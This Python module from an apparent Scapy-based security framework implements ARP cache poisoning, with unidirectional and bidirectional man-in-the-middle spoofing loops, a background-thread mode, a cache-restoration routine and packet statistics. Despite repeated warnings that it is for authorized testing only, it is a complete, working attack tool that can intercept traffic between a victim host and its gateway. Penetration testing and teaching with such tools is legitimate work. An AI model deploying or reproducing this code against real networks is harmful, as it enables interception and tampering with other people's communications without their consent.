"""
ARP Spoofing Attack Module for Scapy Framework

⚠️  CRITICAL ETHICAL WARNING ⚠️
This module is for EDUCATIONAL and AUTHORIZED SECURITY TESTING ONLY.
Unauthorized use is ILLEGAL and can result in criminal prosecution.

Only use in:
- Controlled laboratory environments
- Authorized penetration testing engagements
- Educational demonstrations with proper authorization
- Your own network infrastructure

The authors assume NO responsibility for misuse of this tool.
"""

from typing import Optional, Dict, Any
from scapy.all import ARP, Ether, send, sendp, conf, get_if_hwaddr
import time
import threading

from scapy_framework.core.logger import get_logger
from scapy_framework.utils.validators import is_valid_ip
from scapy_framework.scanner.arp_scanner import ARPScanner

logger = get_logger(__name__)


class ARPSpoofer:
    """
    ARP Spoofing attack implementation.

    Implements Man-in-the-Middle (MITM) attacks via ARP cache poisoning.
    Supports unidirectional and bidirectional spoofing with statistics tracking.

    ⚠️  WARNING: Use only with explicit authorization!
    """

    def __init__(self, interface: Optional[str] = None, verbose: bool = False):
        """
        Initialize ARP Spoofer.

        Args:
            interface: Network interface to use
            verbose: Enable verbose output

        Examples:
            >>> spoofer = ARPSpoofer(interface='eth0')
        """
        self.interface = interface or conf.iface
        self.verbose = verbose
        self.is_spoofing = False
        self.spoof_thread: Optional[threading.Thread] = None

        # Statistics
        self.stats = {
            'packets_sent': 0,
            'start_time': None,
            'end_time': None,
            'target_ip': None,
            'spoofed_ip': None,
        }

        # Original MAC addresses for restoration
        self.original_macs: Dict[str, str] = {}

        logger.warning("⚠️  ARP Spoofer initialized - ENSURE AUTHORIZATION BEFORE USE!")
        logger.info(f"Using interface: {self.interface}")

    def get_mac(self, ip: str) -> Optional[str]:
        """
        Get MAC address for an IP using ARP scan.

        Args:
            ip: IP address to resolve

        Returns:
            MAC address or None if not found
        """
        try:
            scanner = ARPScanner(interface=self.interface)
            results = scanner.scan(f"{ip}/32")
            if results:
                mac = results[0]['mac']
                logger.debug(f"Resolved {ip} -> {mac}")
                return mac
            else:
                logger.warning(f"Could not resolve MAC for {ip}")
                return None
        except Exception as e:
            logger.error(f"Error resolving MAC for {ip}: {e}")
            return None

    def spoof_unidirectional(self,
                             target_ip: str,
                             spoofed_ip: str,
                             target_mac: Optional[str] = None,
                             interval: float = 2.0,
                             count: int = 0) -> None:
        """
        Perform unidirectional ARP spoofing.

        Poisons target's ARP cache to believe spoofed_ip is at attacker's MAC.

        Args:
            target_ip: IP of the victim to poison
            spoofed_ip: IP to impersonate (e.g., gateway)
            target_mac: MAC of target (auto-resolved if not provided)
            interval: Seconds between spoofing packets
            count: Number of packets to send (0 = infinite)

        Examples:
            >>> spoofer.spoof_unidirectional('192.168.1.100', '192.168.1.1')
        """
        if not is_valid_ip(target_ip) or not is_valid_ip(spoofed_ip):
            raise ValueError("Invalid IP address")

        logger.critical("⚠️  STARTING ARP SPOOFING ATTACK ⚠️")
        logger.warning(f"Target: {target_ip} | Spoofing: {spoofed_ip}")
        logger.warning("ENSURE YOU HAVE AUTHORIZATION!")

        # Resolve target MAC if not provided
        if not target_mac:
            target_mac = self.get_mac(target_ip)
            if not target_mac:
                raise ValueError(f"Could not resolve MAC for target {target_ip}")

        # Store original MAC for restoration
        if target_ip not in self.original_macs:
            original_mac = self.get_mac(spoofed_ip)
            if original_mac:
                self.original_macs[target_ip] = original_mac

        self.stats['start_time'] = time.time()
        self.stats['target_ip'] = target_ip
        self.stats['spoofed_ip'] = spoofed_ip
        self.stats['packets_sent'] = 0
        self.is_spoofing = True

        try:
            packets_sent = 0
            while self.is_spoofing and (count == 0 or packets_sent < count):
                # Create malicious ARP reply
                # Tell target that spoofed_ip is at attacker's MAC
                arp_response = ARP(
                    op=2,  # ARP reply
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=spoofed_ip
                    # hwsrc is automatically set to attacker's MAC
                )

                send(arp_response, iface=self.interface, verbose=self.verbose)
                packets_sent += 1
                self.stats['packets_sent'] += 1

                if self.verbose:
                    logger.info(f"Sent ARP poison: {target_ip} [{spoofed_ip} is-at <attacker-mac>]")

                time.sleep(interval)

        except KeyboardInterrupt:
            logger.info("ARP spoofing interrupted by user")
        finally:
            self.is_spoofing = False
            self.stats['end_time'] = time.time()
            logger.info(f"ARP spoofing stopped. Sent {self.stats['packets_sent']} packets")

    def spoof_bidirectional(self,
                            target1_ip: str,
                            target2_ip: str,
                            target1_mac: Optional[str] = None,
                            target2_mac: Optional[str] = None,
                            interval: float = 2.0,
                            count: int = 0) -> None:
        """
        Perform bidirectional ARP spoofing (Man-in-the-Middle).

        Poisons both targets to intercept traffic between them.

        Args:
            target1_ip: First target IP (e.g., victim)
            target2_ip: Second target IP (e.g., gateway)
            target1_mac: MAC of first target
            target2_mac: MAC of second target
            interval: Seconds between spoofing packets
            count: Number of packets to send (0 = infinite)

        Examples:
            >>> # MITM between victim and gateway
            >>> spoofer.spoof_bidirectional('192.168.1.100', '192.168.1.1')
        """
        if not is_valid_ip(target1_ip) or not is_valid_ip(target2_ip):
            raise ValueError("Invalid IP address")

        logger.critical("⚠️  STARTING BIDIRECTIONAL ARP SPOOFING (MITM) ⚠️")
        logger.warning(f"Target 1: {target1_ip} <-> Target 2: {target2_ip}")
        logger.warning("ENSURE YOU HAVE AUTHORIZATION!")

        # Resolve MACs if not provided
        if not target1_mac:
            target1_mac = self.get_mac(target1_ip)
            if not target1_mac:
                raise ValueError(f"Could not resolve MAC for {target1_ip}")

        if not target2_mac:
            target2_mac = self.get_mac(target2_ip)
            if not target2_mac:
                raise ValueError(f"Could not resolve MAC for {target2_ip}")

        # Store original MACs for restoration
        if target1_ip not in self.original_macs:
            self.original_macs[target1_ip] = target2_mac
        if target2_ip not in self.original_macs:
            self.original_macs[target2_ip] = target1_mac

        self.stats['start_time'] = time.time()
        self.stats['target_ip'] = f"{target1_ip} <-> {target2_ip}"
        self.stats['packets_sent'] = 0
        self.is_spoofing = True

        try:
            packets_sent = 0
            while self.is_spoofing and (count == 0 or packets_sent < count):
                # Poison target1: tell it target2_ip is at attacker's MAC
                arp1 = ARP(op=2, pdst=target1_ip, hwdst=target1_mac, psrc=target2_ip)
                send(arp1, iface=self.interface, verbose=self.verbose)

                # Poison target2: tell it target1_ip is at attacker's MAC
                arp2 = ARP(op=2, pdst=target2_ip, hwdst=target2_mac, psrc=target1_ip)
                send(arp2, iface=self.interface, verbose=self.verbose)

                packets_sent += 1
                self.stats['packets_sent'] += 2  # Sent 2 packets per iteration

                if self.verbose:
                    logger.info(f"Sent bidirectional ARP poison: {target1_ip} <-> {target2_ip}")

                time.sleep(interval)

        except KeyboardInterrupt:
            logger.info("Bidirectional ARP spoofing interrupted by user")
        finally:
            self.is_spoofing = False
            self.stats['end_time'] = time.time()
            logger.info(f"Bidirectional ARP spoofing stopped. Sent {self.stats['packets_sent']} packets")

    def spoof_background(self,
                         target_ip: str,
                         spoofed_ip: str,
                         bidirectional: bool = False,
                         interval: float = 2.0) -> None:
        """
        Start ARP spoofing in background thread.

        Args:
            target_ip: Target IP to poison
            spoofed_ip: IP to impersonate
            bidirectional: Use bidirectional spoofing (MITM)
            interval: Seconds between packets

        Examples:
            >>> spoofer.spoof_background('192.168.1.100', '192.168.1.1', bidirectional=True)
            >>> # Do other work...
            >>> spoofer.stop()
        """
        if self.is_spoofing:
            logger.warning("Spoofing already running")
            return

        if bidirectional:
            target_func = lambda: self.spoof_bidirectional(target_ip, spoofed_ip, interval=interval)
        else:
            target_func = lambda: self.spoof_unidirectional(target_ip, spoofed_ip, interval=interval)

        self.spoof_thread = threading.Thread(target=target_func, daemon=True)
        self.spoof_thread.start()
        logger.info("ARP spoofing started in background")

    def stop(self) -> None:
        """
        Stop ARP spoofing.

        Examples:
            >>> spoofer.stop()
        """
        if self.is_spoofing:
            logger.info("Stopping ARP spoofing...")
            self.is_spoofing = False

            if self.spoof_thread:
                self.spoof_thread.join(timeout=5)

            logger.info("ARP spoofing stopped")
        else:
            logger.warning("ARP spoofing is not running")

    def restore(self, target_ip: str, spoofed_ip: Optional[str] = None, count: int = 5) -> None:
        """
        Restore original ARP cache entries.

        Sends correct ARP replies to fix poisoned caches.

        Args:
            target_ip: Target IP to restore
            spoofed_ip: Spoofed IP to restore (uses stored if not provided)
            count: Number of restoration packets to send

        Examples:
            >>> spoofer.restore('192.168.1.100', '192.168.1.1')
        """
        logger.info(f"Restoring ARP cache for {target_ip}")

        # Get target MAC
        target_mac = self.get_mac(target_ip)
        if not target_mac:
            logger.error(f"Cannot restore: Could not resolve MAC for {target_ip}")
            return

        # Get original MAC
        if spoofed_ip:
            original_mac = self.get_mac(spoofed_ip)
        elif target_ip in self.original_macs:
            original_mac = self.original_macs[target_ip]
            spoofed_ip = self.stats.get('spoofed_ip', 'unknown')
        else:
            logger.error("Cannot restore: No original MAC address stored")
            return

        if not original_mac:
            logger.error("Cannot restore: Could not determine original MAC")
            return

        # Send correct ARP replies
        for i in range(count):
            arp_restore = ARP(
                op=2,  # ARP reply
                pdst=target_ip,
                hwdst=target_mac,
                psrc=spoofed_ip,
                hwsrc=original_mac  # Correct MAC
            )

            send(arp_restore, iface=self.interface, verbose=self.verbose)
            logger.debug(f"Sent ARP restore packet {i+1}/{count}")
            time.sleep(0.5)

        logger.info(f"ARP cache restoration completed for {target_ip}")

    def get_statistics(self) -> Dict[str, Any]:
        """
        Get spoofing statistics.

        Returns:
            Dictionary with statistics

        Examples:
            >>> stats = spoofer.get_statistics()
            >>> print(f"Packets sent: {stats['packets_sent']}")
        """
        duration = 0
        if self.stats['start_time'] and self.stats['end_time']:
            duration = self.stats['end_time'] - self.stats['start_time']

        return {
            'packets_sent': self.stats['packets_sent'],
            'duration': duration,
            'packets_per_second': self.stats['packets_sent'] / duration if duration > 0 else 0,
            'target_ip': self.stats.get('target_ip'),
            'spoofed_ip': self.stats.get('spoofed_ip'),
            'is_running': self.is_spoofing,
        }

    def print_statistics(self) -> None:
        """
        Print spoofing statistics to console.

        Examples:
            >>> spoofer.print_statistics()
        """
        stats = self.get_statistics()

        print("\n" + "=" * 60)
        print("ARP SPOOFING STATISTICS")
        print("=" * 60)
        print(f"Packets Sent:      {stats['packets_sent']}")
        print(f"Duration:          {stats['duration']:.2f} seconds")
        print(f"Packets/sec:       {stats['packets_per_second']:.2f}")
        print(f"Target IP:         {stats['target_ip']}")
        print(f"Spoofed IP:        {stats['spoofed_ip']}")
        print(f"Status:            {'Running' if stats['is_running'] else 'Stopped'}")
        print("=" * 60 + "\n")


def arp_spoof(target_ip: str,
              spoofed_ip: str,
              bidirectional: bool = False,
              interface: Optional[str] = None,
              interval: float = 2.0,
              count: int = 10) -> None:
    """
    Quick ARP spoofing function.

    Args:
        target_ip: Target IP to poison
        spoofed_ip: IP to impersonate
        bidirectional: Use bidirectional spoofing
        interface: Network interface
        interval: Seconds between packets
        count: Number of packets (0 = infinite)

    Examples:
        >>> arp_spoof('192.168.1.100', '192.168.1.1', count=10)
    """
    spoofer = ARPSpoofer(interface=interface)

    try:
        if bidirectional:
            spoofer.spoof_bidirectional(target_ip, spoofed_ip, interval=interval, count=count)
        else:
            spoofer.spoof_unidirectional(target_ip, spoofed_ip, interval=interval, count=count)
    finally:
        spoofer.restore(target_ip, spoofed_ip)
